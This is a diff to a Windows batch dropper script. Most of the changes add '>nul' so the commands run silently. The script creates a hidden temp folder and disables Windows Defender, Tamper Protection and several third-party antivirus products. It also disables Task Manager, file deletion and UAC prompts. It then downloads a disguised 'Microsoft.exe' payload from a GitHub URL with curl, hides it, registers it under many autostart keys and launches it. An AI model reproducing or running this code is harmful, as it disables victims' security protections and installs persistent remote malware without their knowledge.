@@ -22,11 +22,11 @@ goto :eof
 :admin
 
 REM Create hidden and random folder
-set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
+set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%" 
 mkdir "%hiddenFolder2%"
 
 REM Set hidden attribute for folder
-attrib +h +s "%hiddenFolder2%"
+attrib +h +s "%hiddenFolder2%" 
 
 cd "%hiddenFolder2%"
 
@@ -69,72 +69,72 @@ reg copy "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWAR
 reg copy "HKLM\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
 reg copy "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked" /v "{09A47860-11B0-4DA5-AFA5-26D86198A780}" /t REG_SZ /f >nul
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /f /ve
-REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
-REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
-REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\AVAST Software\Avast" /v DisableAntiVirus /t REG_DWORD /d 1 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\McAfee\Endpoint\AV" /v EnableOnAccessScan /t REG_DWORD /d 0 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Symantec\Symantec Endpoint Protection\SMC" /v smc_enable /t REG_DWORD /d 0 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\TrendMicro\PC-cillinNTCorp\CurrentVersion\Misc." /v AllowUnloading /t REG_DWORD /d 1 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\360Safe\SafeDog" /v Enable /t REG_DWORD /d 0 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\KasperskyLab\protected\AVP13\settings" /v Enable /t REG_DWORD /d 0 /f
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\SecureMac" /v GlobalSwitch /t REG_DWORD /d 0 /f
-REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /f /ve >nul
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\AVAST Software\Avast" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\McAfee\Endpoint\AV" /v EnableOnAccessScan /t REG_DWORD /d 0 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Symantec\Symantec Endpoint Protection\SMC" /v smc_enable /t REG_DWORD /d 0 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\TrendMicro\PC-cillinNTCorp\CurrentVersion\Misc." /v AllowUnloading /t REG_DWORD /d 1 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\360Safe\SafeDog" /v Enable /t REG_DWORD /d 0 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\KasperskyLab\protected\AVP13\settings" /v Enable /t REG_DWORD /d 0 /f >nul
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\SecureMac" /v GlobalSwitch /t REG_DWORD /d 0 /f >nul
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f >nul
 
 
 ::internal
 REM Disable Symantec Endpoint Protection's auto-protect feature
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\AV" /v EnableAutoProtect /t REG_DWORD /d 0 /f
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\AV" /v EnableAutoProtect /t REG_DWORD /d 0 /f >nul
 REM Disable a specific Windows feature using its feature ID
 REM Note: change the feature ID (2093230218) to the one you want to disable
-REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\FeatureManagement\Overrides\0\2093230218" /v EnabledState /t REG_DWORD /d 0 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\FeatureManagement\Overrides\0\2093230218" /v EnabledState /t REG_DWORD /d 0 /f >nul
 REM Disable Windows Defender's Tamper Protection feature
-REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul
 REM Set the startup type of the Security Health Service to disabled
-REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f
+REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f >nul
 REM Disable Task Manager
-REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
+REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul
 REM Prevent file deletion in File Explorer
-REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDelete /t REG_DWORD /d 1 /f
+REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDelete /t REG_DWORD /d 1 /f >nul
 REM Enable the Admin Approval Mode for the built-in Administrator account
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f >nul
 REM Disable the UAC consent prompt for the built-in Administrator account
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f >nul
 
-powershell Set-MpPreference -DisableRealtimeMonitoring $true
-powershell Set-MpPreference -PUAProtection 0
-powershell Set-MpPreference -SubmitSamplesConsent 1
-powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
-powershell Add-MpPreference -ExclusionPath 'C:\*.exe'
-
+powershell Set-MpPreference -DisableRealtimeMonitoring $ >nul
+powershell Set-MpPreference -PUAProtection 0 >nul
+powershell Set-MpPreference -SubmitSamplesConsent 1 >nul
+powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned >nul
+powershell Add-MpPreference -ExclusionPath 'C:\*.exe' >nul
+ 
 REM Exclude hidden folder from Windows Defender
-powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'"
+powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'" >nul
 
 REM Download payload files to hidden folder using curl
-curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe"
+curl -s https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe" >nul
 
 REM Set hidden attribute for files
-attrib +h +s "%hiddenFolder2%\Microsoft.exe"
+attrib +h +s "%hiddenFolder2%\Microsoft.exe" >nul
 
 REM Add registry key to start Microsoft.exe on boot
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft.exe" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft.exe" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f >nul
 
-reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
 
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
+reg add HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows /v Microsoft.exe /d "%hiddenFolder2%\Microsoft.exe" /f >nul
 
-start /B Microsoft.exe"
+start /B Microsoft.exe" >nul
 
 goto :eof
